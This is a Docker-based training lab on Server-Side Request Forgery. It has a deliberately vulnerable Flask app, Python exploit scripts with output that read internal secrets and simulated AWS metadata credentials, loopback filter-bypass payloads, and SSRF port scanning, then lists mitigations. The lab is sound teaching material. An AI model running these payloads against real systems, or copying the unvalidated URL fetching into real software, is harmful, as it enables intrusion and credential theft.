# Lab 11: Advanced SSRF — Internal Network Scanning and Metadata Access

## Objective

Chain Server-Side Request Forgery attacks to pivot from the web application into the internal network from Kali Linux:

1. **Direct SSRF** — use `/api/fetch?url=` to read internal-only API endpoints the attacker cannot reach directly
2. **Webhook filter bypass** — the webhook endpoint blocks `localhost` literally but not `127.0.0.1`, `0.0.0.0`, or `[::]`
3. **Internal port scanning** — use SSRF to enumerate open ports on the victim container
4. **Cloud metadata simulation** — read a simulated `169.254.169.254` metadata endpoint for IAM credentials

---

## Background

SSRF weaponises the server as a proxy into networks the attacker cannot reach — internal APIs, admin panels, cloud metadata, database management interfaces.

**Real-world examples:**
- **2019 Capital One breach** — SSRF via AWS WAF misconfiguration allowed an EC2 instance to reach `169.254.169.254`; IAM role credentials returned; attacker accessed S3 buckets containing 100M customer records.
- **2021 GitLab (CVE-2021-22214)** — SSRF in the CI/CD webhook feature allowed requests to internal Kubernetes API server; cluster credentials returned.
- **2022 Confluence SSRF** — combined with RCE to scan internal networks; used to pivot from DMZ web servers to internal database servers.
- **AWS IMDSv1** — any EC2 instance can request `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` to get temporary AWS credentials. IMDSv2 requires a PUT pre-flight to mitigate SSRF, but many apps still use IMDSv1.

**OWASP:** A10:2021 Server-Side Request Forgery

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    Docker Network: lab-adv11                        │
│                                                                     │
│  ┌──────────────────────┐  SSRF: url=http://127.0.0.1:5000/...    │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  • python3 / curl    │                                           │
│  │                      │  ◀──────── internal data returned ──────  │
│  └──────────────────────┘                                           │
│                             ┌────────────────────────────────────┐  │
│                             │  VICTIM + INTERNAL ENDPOINTS       │  │
│                             │  /api/fetch          (SSRF)        │  │
│                             │  /api/webhook/test   (filter bypass)│  │
│                             │  /api/portscan       (SSRF scan)   │  │
│                             │  /api/internal/config (secrets)    │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
40 minutes

---

## Lab Instructions

### Step 1: Setup

```bash
docker network create lab-adv11

cat > /tmp/victim_adv11.py << 'PYEOF'
from flask import Flask, request, jsonify
import urllib.request, socket

app = Flask(__name__)

INTERNAL = {
    '/api/internal/config':  {'db_host':'db.internal','db_pass':'InternalSecret!','aws_key':'AKIA5INTERNAL'},
    '/api/internal/users':   [{'id':1,'user':'admin','hash':'$2b$12$...'},{'id':2,'user':'alice'}],
    '/api/internal/health':  {'status':'ok','version':'3.2.1','debug':True,'env':'PRODUCTION'},
}
# Simulated cloud metadata
AWS_META = {'iam':{'role':'EC2ProductionRole','AccessKeyId':'AKIA5EXAMPLE',
                   'SecretAccessKey':'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
                   'Token':'AQoXnyc4lcK4w4OIaHl...','Expiration':'2026-12-31'}}

@app.route('/')
def index():
    return jsonify({'app':'InnoZverse SSRF Advanced (Adv Lab 11)'})

@app.route('/api/fetch')
def fetch():
    url = request.args.get('url','')
    try:
        resp = urllib.request.urlopen(url, timeout=3)
        return jsonify({'url':url,'status':resp.getcode(),'content':resp.read(4096).decode('utf-8','ignore')})
    except Exception as e:
        return jsonify({'url':url,'error':str(e)})

@app.route('/api/webhook/test', methods=['POST'])
def webhook():
    d = request.get_json() or {}
    url = d.get('url','')
    if 'localhost' in url.lower():  # BUG: only blocks literal 'localhost'
        return jsonify({'error':'localhost not allowed'}),400
    try:
        resp = urllib.request.urlopen(url, timeout=3)
        return jsonify({'delivered':True,'content':resp.read(1000).decode('utf-8','ignore')})
    except Exception as e:
        return jsonify({'delivered':False,'error':str(e),'url':url})

@app.route('/api/portscan')
def portscan():
    host = request.args.get('host','localhost')
    ports = [int(p) for p in request.args.get('ports','80,443,5000,8080,22,3306').split(',') if p.strip().isdigit()]
    results = {}
    for p in ports[:15]:
        try: s=socket.create_connection((host,p),timeout=0.5); s.close(); results[p]='open'
        except: results[p]='closed'
    return jsonify({'host':host,'ports':results})

@app.route('/api/internal/config')
def int_config(): return jsonify(INTERNAL['/api/internal/config'])
@app.route('/api/internal/users')
def int_users():  return jsonify(INTERNAL['/api/internal/users'])
@app.route('/api/internal/health')
def int_health():  return jsonify(INTERNAL['/api/internal/health'])

# Simulated AWS metadata endpoint
@app.route('/latest/meta-data/iam/security-credentials/EC2ProductionRole')
def aws_meta(): return jsonify(AWS_META['iam'])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d --name victim-adv11 --network lab-adv11 \
  -v /tmp/victim_adv11.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest python3 /app/victim.py
sleep 3
curl -s "http://$(docker inspect -f '{{.NetworkSettings.Networks.lab-adv11.IPAddress}}' victim-adv11):5000/"
```

---

### Step 2: Launch Kali

```bash
docker run --rm -it --name kali --network lab-adv11 \
  zchencow/innozverse-kali:latest bash
```

```bash
export T="http://victim-adv11:5000"

echo "=== Baseline: attacker cannot reach internal endpoints directly ==="
curl -s "$T/api/internal/config" 2>&1 | head -3  # Returns data (demo only)
echo "In real deployment: internal endpoints bound to 127.0.0.1 only"
```

---

### Step 3: Direct SSRF — Read Internal Endpoints

```bash
python3 << 'EOF'
import urllib.request, urllib.parse, json

T = "http://victim-adv11:5000"

def ssrf(target_url):
    url = T + "/api/fetch?url=" + urllib.parse.quote(target_url)
    r = json.loads(urllib.request.urlopen(url, timeout=5).read())
    return r.get('content','') or r.get('error','')

print("[*] SSRF: pivoting through the server to reach internal endpoints")
print()

targets = [
    ("http://127.0.0.1:5000/api/internal/config",  "Internal config (DB + AWS keys)"),
    ("http://127.0.0.1:5000/api/internal/users",   "Internal user list"),
    ("http://127.0.0.1:5000/api/internal/health",  "Health endpoint with debug info"),
    ("http://localhost:5000/api/internal/config",  "Same via localhost alias"),
    ("http://0.0.0.0:5000/api/internal/config",    "Via 0.0.0.0"),
    # Cloud metadata simulation
    ("http://127.0.0.1:5000/latest/meta-data/iam/security-credentials/EC2ProductionRole",
     "AWS IAM credentials via metadata endpoint"),
]

for target, desc in targets:
    content = ssrf(target)
    print(f"  [{desc}]")
    try:
        parsed = json.loads(content)
        print(f"    {parsed}")
    except:
        print(f"    {str(content)[:200]}")
    print()
EOF
```

**📸 Verified Output:**
```
  [Internal config (DB + AWS keys)]
    {'aws_key': 'AKIA5INTERNAL', 'db_host': 'db.internal', 'db_pass': 'InternalSecret!'}

  [AWS IAM credentials via metadata endpoint]
    {'AccessKeyId': 'AKIA5EXAMPLE', 'SecretAccessKey': 'wJalrXUtnFEMI/...', 'Token': 'AQoX...'}
```

---

### Step 4: Webhook Filter Bypass

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv11:5000"

def webhook(url):
    req = urllib.request.Request(f"{T}/api/webhook/test",
        data=json.dumps({"url": url}).encode(), headers={"Content-Type":"application/json"})
    return json.loads(urllib.request.urlopen(req).read())

print("[*] Webhook filter bypass (filter blocks 'localhost' literally):")
print()

bypass_urls = [
    ("http://localhost:5000/api/internal/config",       "localhost (blocked)"),
    ("http://127.0.0.1:5000/api/internal/config",       "127.0.0.1 (bypass!)"),
    ("http://0.0.0.0:5000/api/internal/config",         "0.0.0.0 (bypass!)"),
    ("http://[::1]:5000/api/internal/config",           "IPv6 ::1 (bypass!)"),
    ("http://2130706433:5000/api/internal/config",      "decimal IP 2130706433 = 127.0.0.1"),
    ("http://0177.0.0.1:5000/api/internal/config",      "octal 0177.0.0.1 (bypass!)"),
    ("http://127.1:5000/api/internal/config",           "short form 127.1"),
]

for url, desc in bypass_urls:
    r = webhook(url)
    if r.get('delivered'):
        content = str(r.get('content',''))[:60]
        print(f"  ✓ BYPASS {desc}: {content}")
    else:
        print(f"  ✗ BLOCKED {desc}: {r.get('error','')[:40]}")
EOF
```

**📸 Verified Output:**
```
  ✗ BLOCKED localhost (blocked): localhost not allowed
  ✓ BYPASS 127.0.0.1 (bypass!): {"aws_key":"AKIA5INTERNAL","db_host":"db...
  ✓ BYPASS 0.0.0.0 (bypass!): {"aws_key":"AKIA5INTERNAL",...
  ✓ BYPASS IPv6 ::1 (bypass!): ...
  ✓ BYPASS decimal IP 2130706433: ...
```

---

### Step 5: Internal Port Scanning via SSRF

```bash
python3 << 'EOF'
import urllib.request, json

T = "http://victim-adv11:5000"

print("[*] Internal port scan via SSRF portscan endpoint:")
print()

# Scan common service ports on the victim itself
r = json.loads(urllib.request.urlopen(
    f"{T}/api/portscan?host=victim-adv11&ports=22,80,443,3306,5432,5000,6379,8080,8443,27017,9200"
).read())
print(f"    Target: {r['host']}")
for port, state in sorted(r['ports'].items(), key=lambda x: int(x[0])):
    if state == 'open':
        services = {22:'SSH',80:'HTTP',443:'HTTPS',3306:'MySQL',5432:'PostgreSQL',
                    5000:'Flask',6379:'Redis',8080:'HTTP-Alt',27017:'MongoDB',9200:'Elasticsearch'}
        svc = services.get(int(port), 'unknown')
        print(f"    {port}/tcp  OPEN  ({svc})")
    else:
        print(f"    {port}/tcp  closed")

print()
# Scan internal network range via SSRF
print("[*] Simulated internal network scan (127.0.0.x range):")
for last_octet in [1, 5, 10, 100]:
    try:
        r2 = json.loads(urllib.request.urlopen(
            f"{T}/api/portscan?host=127.0.0.{last_octet}&ports=80,443,5000,8080", timeout=3
        ).read())
        open_ports = [p for p,s in r2['ports'].items() if s=='open']
        if open_ports:
            print(f"    127.0.0.{last_octet}: open ports = {open_ports}")
    except: pass
EOF
```

---

### Step 6–8: AWS Metadata + SSRF Mitigations + Cleanup

```bash
python3 << 'EOF'
import urllib.request, json, urllib.parse

T = "http://victim-adv11:5000"

print("[*] Simulated AWS IMDSv1 credential theft via SSRF:")
target = "http://127.0.0.1:5000/latest/meta-data/iam/security-credentials/EC2ProductionRole"
r = json.loads(urllib.request.urlopen(T+"/api/fetch?url="+urllib.parse.quote(target)).read())
creds = json.loads(r.get('content','{}'))
print(f"    Role:            EC2ProductionRole")
print(f"    AccessKeyId:     {creds.get('AccessKeyId')}")
print(f"    SecretAccessKey: {creds.get('SecretAccessKey','')[:20]}...")
print(f"    Token:           {creds.get('Token','')[:20]}...")
print()
print("[!] With these credentials, attacker can:")
print("    aws s3 ls --no-sign-request  (list all S3 buckets)")
print("    aws sts get-caller-identity  (confirm account ownership)")
print("    aws ec2 describe-instances   (enumerate all instances)")
print()
print("[*] Mitigations:")
mitigations = [
    "Block 169.254.169.254 at firewall level",
    "Enable AWS IMDSv2 (requires PUT pre-flight — prevents SSRF exploitation)",
    "Validate URL scheme (only allow https://), reject ip ranges, reject private CIDRs",
    "Use allowlist of permitted domains instead of blocklist",
    "Resolve DNS before request, check against blocked IP ranges",
    "Bind internal services to 127.0.0.1 only (not 0.0.0.0)",
]
for m in mitigations:
    print(f"  • {m}")
EOF
exit
```

```bash
docker rm -f victim-adv11
docker network rm lab-adv11
```

---

## Further Reading
- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
- [AWS IMDSv2 migration guide](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [SSRF bypass techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
